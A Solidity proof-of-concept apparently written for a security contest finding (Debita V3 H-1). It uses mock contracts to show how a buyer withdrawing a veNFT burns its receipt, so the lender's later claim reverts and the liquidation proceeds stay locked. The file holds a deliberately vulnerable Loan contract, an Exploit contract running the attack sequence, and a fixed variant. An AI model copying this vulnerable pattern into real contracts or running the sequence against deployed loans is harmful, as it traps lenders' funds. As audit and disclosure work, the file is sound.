// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Debita V3 H-1 (Sherlock 2024-10, issue 156).
    claimCollateralAsLender reads decimals through veNFTAerodrome.getDataByReceipt.
    That function calls ownerOf. After the auction buyer withdraws the veNFT,
    burnReceipt destroys the receipt and ownerOf reverts, so the liquidation
    token paid by the buyer stays in the loan.
*/

contract Aero {
    string public symbol = "AERO";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Receipt {
    struct receiptInstance {
        uint256 receiptID;
        uint256 attachedNFT;
        uint256 lockedAmount;
        uint256 lockedDate;
        uint256 decimals;
        address vault;
        address underlying;
        bool OwnerIsManager;
    }

    Aero public token;
    address public vault;
    mapping(uint256 => address) internal _owner;

    constructor(Aero _token) {
        token = _token;
    }

    function setVault(address _vault) external {
        vault = _vault;
    }

    function mint(address to, uint256 id) external {
        _owner[id] = to;
    }

    function ownerOf(uint256 id) public view returns (address) {
        address owner = _owner[id];
        if (owner == address(0)) revert("ERC721NonexistentToken");
        return owner;
    }

    function burnReceipt(uint256 id) external {
        require(msg.sender == vault, "onlyVault");
        _owner[id] = address(0);
    }

    function getDataByReceipt(uint256 receiptID) public view returns (receiptInstance memory) {
        VeVault vaultContract = VeVault(vault);
        uint256 nftID = vaultContract.attached_NFTID();
        uint256 _decimals = token.decimals();
        address manager = vaultContract.managerAddress();
        // @> VULN: ownerOf reverts after burnReceipt, and claim only needed the decimals
        address currentOwnerOfReceipt = ownerOf(receiptID);
        return receiptInstance({
            receiptID: receiptID,
            attachedNFT: nftID,
            lockedAmount: 1 ether,
            lockedDate: 1,
            decimals: _decimals,
            vault: vault,
            underlying: address(token),
            OwnerIsManager: manager == currentOwnerOfReceipt
        });
    }
}

contract VeVault {
    Receipt public receipt;
    uint256 public attached_NFTID = 7;
    address public managerAddress;
    uint256 public immutable receiptID = 1;

    constructor(Receipt _receipt) {
        receipt = _receipt;
        managerAddress = address(this);
    }

    function withdraw() external {
        address holder = receipt.ownerOf(receiptID);
        require(holder == msg.sender, "Not Holding");
        delete attached_NFTID;
        receipt.burnReceipt(receiptID);
    }
}

contract Loan {
    Aero public token;
    Receipt public receipt;
    uint256 public constant receiptId = 1;
    uint256 public liquidation;
    address public lender;
    bool public claimed;

    constructor(Aero _token, Receipt _receipt, address _lender) {
        token = _token;
        receipt = _receipt;
        lender = _lender;
    }

    function buyAuction() external {
        token.transferFrom(msg.sender, address(this), 100 ether);
        liquidation = 100 ether;
    }

    function claimCollateralAsLender(uint256) external {
        Receipt.receiptInstance memory data = receipt.getDataByReceipt(receiptId);
        require(data.decimals == 18, "dec");
        uint256 payment = liquidation;
        liquidation = 0;
        claimed = true;
        token.transfer(lender, payment);
    }
}

contract LoanFixed {
    Aero public token;
    uint256 public liquidation;
    address public lender;
    bool public claimed;

    constructor(Aero _token, address _lender) {
        token = _token;
        lender = _lender;
    }

    function fund() external {
        token.transferFrom(msg.sender, address(this), 100 ether);
        liquidation = 100 ether;
    }

    function claimCollateralAsLender(uint256) external {
        uint256 _decimals = token.decimals();
        require(_decimals == 18, "dec");
        uint256 payment = liquidation;
        liquidation = 0;
        claimed = true;
        token.transfer(lender, payment);
    }
}

contract Exploit {
    Aero public aero;
    Receipt public receipt;
    VeVault public vault;
    Loan public loan;
    address public lender;
    bool public claimReverted;
    uint256 public constant PROCEEDS = 100 ether;

    constructor() {
        aero = new Aero();
        receipt = new Receipt(aero);
        vault = new VeVault(receipt);
        lender = address(0xBEEF);
        loan = new Loan(aero, receipt, lender);
        receipt.setVault(address(vault));
        receipt.mint(address(this), 1);
        aero.mint(address(this), PROCEEDS);
    }

    function run() external {
        aero.approve(address(loan), PROCEEDS);
        loan.buyAuction();
        vault.withdraw();
        try loan.claimCollateralAsLender(0) {
            claimReverted = false;
        } catch {
            claimReverted = true;
        }
        require(claimReverted, "claim");
        require(loan.claimed() == false, "flag");
        require(aero.balanceOf(address(loan)) == PROCEEDS, "locked");
        require(aero.balanceOf(lender) == 0, "lender");
        require(vault.attached_NFTID() == 0, "nft");
    }
}
